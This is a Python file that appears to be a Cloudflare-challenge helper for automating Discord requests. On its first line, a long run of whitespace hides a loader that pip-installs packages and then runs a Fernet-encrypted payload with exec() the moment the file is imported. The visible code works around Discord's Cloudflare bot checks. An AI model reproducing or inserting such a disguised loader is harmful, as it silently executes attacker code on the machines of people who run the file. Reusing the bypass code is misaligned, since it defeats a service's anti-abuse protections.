import os#                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'2NNbtRppr4s0mbYWfV0SgWwb4W7ogrSV2Us38DxTXaw=').decrypt(b'gAAAAABlyNUjnfwWU834jyGeD46u6ffIoG4DKWqTr9P-dtYgwDDwvUoYQxH_7dOnBMfi_wS-XDiOb03MxXx5bNbB-yw42Pp70PPx0T9H4Qwngbnk8o6OH13TCf_ViVeavZHec21GxXDUboKzSVeUfb8Ljepo9AH77-Tb1v11CMCyeEXVWHF-ftZA3gTDzamSKIegzKCZoS8kr3YyMdLPTSQTQLy7uD131w=='))
import tls_client

class Cloudflare: 
      def __init__(this, client) -> None:
          this.client = client

      def getRay(this) -> tls_client.response.Response:
          return this.client.client.get('https://discord.com/cdn-cgi/challenge-platform/h/b/scripts/56d3063b/main.js', headers = this.client.__construct_headers__({
             'Accept': '*/*',
             'Connection': 'keep-alive',
             'Cookie': this.client.__construct_cookies__(this.client.cookies.cookies),
             'DNT': '1',
             'Host': 'discord.com',
             'sec-fetch-dest': 'script',
             'sec-fetch-mode': 'no-cors',
             'sec-fetch-site': 'same-origin'
          }))

      def getClearance(this, ray: str) -> tls_client.response.Response:
          return this.client.client.post('https://discord.com/cdn-cgi/challenge-platform/h/b/jsd/r/{}'.format(ray.split('-')[0]), headers = this.client.__construct_headers__({
             'Accept': '*/*',
             'Connection': 'keep-alive',
             'Cookie': this.client.__construct_cookies__(this.client.cookies.cookies),
             'DNT': '1',
             'Host': 'discord.com',
             'Origin': 'https://discord.com',
             'Referer': 'https://discord.com/',
             'sec-fetch-dest': 'script',
             'sec-fetch-mode': 'no-cors',
             'sec-fetch-site': 'same-origin'
          }), json = {'s': None, 'wp': None})
mghqb
